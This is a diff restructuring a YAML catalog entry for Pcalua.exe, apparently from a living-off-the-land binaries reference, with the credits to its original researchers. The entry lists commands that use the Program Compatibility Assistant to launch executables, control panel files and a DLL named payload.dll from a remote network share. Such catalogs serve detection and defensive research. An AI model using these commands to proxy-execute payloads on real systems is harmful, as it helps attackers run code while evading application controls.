@@ -1,31 +1,17 @@
 ---
+name: Pcalua.exe
+description: 
 functions:
   execute:
-    -
-      Name: Pcalua.exe
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: pcalua.exe -a calc.exe
-          Description: Open the target .EXE using the Program Compatibility Assistant.
-          Command: pcalua.exe -a \\server\payload.dll
-          Description: Open the target .DLL file with the Program Compatibilty Assistant.
-          Command: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
-          Description: Open the target .CPL file with the Program Compatibility Assistant.
-      Full_Path:
-          c:\windows\system32\pcalua.exe
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://twitter.com/KyleHanslovan/status/912659279806640128
-      Notes: |
-          Thanks to:
-          fab - @0rbz_
-          Kyle Hanslovan - @KyleHanslovan
-
+    - description: Open the target .EXE using the Program Compatibility Assistant.
+      code: pcalua.exe -a calc.exe
+    - description: Open the target .DLL file with the Program Compatibilty Assistant.
+      code: pcalua.exe -a \\server\payload.dll
+    - description: Open the target .CPL file with the Program Compatibility Assistant.
+      code: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
+resources: 
+    - resource: https://twitter.com/KyleHanslovan/status/912659279806640128
+fullpath: 
+    - path: c:\windows\system32\pcalua.exe
+notes: Thanks to fab - @0rbz_, Kyle Hanslovan - @KyleHanslovan
 ---
